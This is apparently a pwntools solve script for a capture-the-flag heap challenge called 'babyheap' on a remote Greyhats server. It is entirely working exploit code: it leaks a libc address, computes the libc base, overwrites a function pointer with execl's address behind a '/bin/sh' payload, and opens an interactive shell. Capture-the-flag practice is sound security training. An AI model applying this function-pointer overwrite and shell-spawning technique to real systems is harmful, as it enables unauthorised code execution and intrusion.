from pwn import *

# p = process("./babyheap")
p = remote("challs.nusgreyhats.org", 31367)
context.log_level = 'debug'

PROMPT = b'3. Make greycat talk\n'

p.sendlineafter(PROMPT, b"6767")
leak = int(p.recvline()[:-1].decode(), 16)
print(f"leak: {hex(leak)}")
libc_base = leak - (0x7ac64fca50a0 - 0x00007ac64fc00000)
print(f"libc base: {hex(libc_base)}")

p.sendlineafter(PROMPT, b"2") # create a greycat
pl = b'/bin/sh' + b'\x00' * 5 + b'\x00' * 0x18
# cannot use system() since the address has whitespace
# cannot use execve since invalid envp
pl += p64(libc_base + (0x77dfb9ceb3f0 - 0x000077dfb9c00000)) # overwrite fn ptr to execl address
p.sendlineafter(b"Enter greycat name:\n", pl)

p.sendlineafter(PROMPT, b"3") # trigger the function
p.sendlineafter(b"Greycat index:", b"0")
p.interactive()